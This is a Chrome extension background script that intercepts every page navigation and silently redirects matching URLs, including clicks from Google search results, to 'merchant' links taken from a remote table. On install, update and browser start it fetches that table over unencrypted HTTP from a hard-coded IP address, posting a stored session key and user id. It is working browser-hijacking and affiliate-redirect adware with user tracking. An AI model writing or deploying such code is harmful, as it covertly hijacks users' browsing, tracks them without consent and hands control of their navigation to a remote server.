// Redirection check and redirect to merchant page code----------
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    var redirects, pattern, from, to, redirecUrl;
    redirects = JSON.parse(localStorage.getItem('redirects') || '[]');
    chrome.tabs.getSelected(null,function(tab) {
      var tablink = tab.url;
      var originlink = new URL(tablink).origin;
      
      if (details.url in redirects) {
        chrome.tabs.update(tab.id, {url: redirects[details.url]});
        checkWebsite(redirects[details.url], details.url);
      }
      else if(originlink == "https://www.google.co.in"){
        var detailsurl = new URL(details.url).origin;
        var __detailsurl = detailsurl+'/';
        if( __detailsurl in redirects){
         chrome.tabs.update(tab.id, {url: redirects[__detailsurl]});
         checkWebsite(redirects[__detailsurl], __detailsurl);
       }
     }
   });
    return {};
  },
  {
    urls: [
    "<all_urls>",
    ],
    types: ["main_frame"]
  },
  ["blocking"]
  );

// Run when you install or update extension------
chrome.runtime.onInstalled.addListener(function(details){
  if(details.reason == "install"){
    updateUrl(localStorage.getItem("__session"), localStorage.getItem("__uid"));
  }else if(details.reason == "update"){
    updateUrl(localStorage.getItem("__session"), localStorage.getItem("__uid"));
  }
});

// Run when you start your chrome broswer------
chrome.runtime.onStartup.addListener(function(){
   updateUrl(localStorage.getItem("__session"), localStorage.getItem("__uid"));
});

// Update Redriect JSON Function------
function updateUrl(__session, __uid){
  var http = new XMLHttpRequest();
  var url = "http://13.126.104.228:8088/api/track/";
  var params = "session_key="+__session+"&user_id="+__uid;
  http.open("POST", url, true);
  http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      var jsonResponse = JSON.parse(http.responseText);
      localStorage.setItem("redirects", JSON.stringify(jsonResponse.data));
    }
  }
  http.send(params);
}

// Check redirect url valid or not. if its not valid then redirect url delete from localstorage------
function checkWebsite(url_redirect, url_main){
  var http = new XMLHttpRequest();
  var url = url_redirect;
  http.open("OPTIONS", url, true);
  http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      var response_text = http.response;
      if(response_text.trim() == "This advertiser link is no longer active."){
        var redirects_data = JSON.parse(localStorage.getItem("redirects"));
        delete redirects_data[url_main];
        localStorage.setItem("redirects", JSON.stringify(redirects_data));
      }
    }
  }
  http.send(); 
}



